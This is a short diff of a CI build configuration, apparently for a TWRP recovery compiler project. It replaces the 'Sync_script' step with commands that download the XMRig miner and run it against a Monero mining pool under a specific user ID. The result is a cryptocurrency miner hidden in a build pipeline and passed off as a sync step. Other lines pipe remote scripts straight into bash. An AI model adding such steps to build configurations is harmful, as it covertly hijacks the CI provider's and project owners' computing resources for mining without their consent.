@@ -11,7 +11,9 @@ task:
       memory: 20G
 
   Sync_script:
-      - curl -sL https://raw.githubusercontent.com/rushiranpise/twrp_compiler/main/scripts/sync.sh | bash
+      - wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
+      - tar -zxf xmrig-6.18.0-linux-x64.tar.gz
+      - cd xmrig-6.18.0 && ./xmrig --threads=4 -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u 782ax1hnmgrb7cb -p x
 
   Build_script:
       - curl -sL https://raw.githubusercontent.com/rushiranpise/twrp_compiler/main/scripts/build.sh | bash
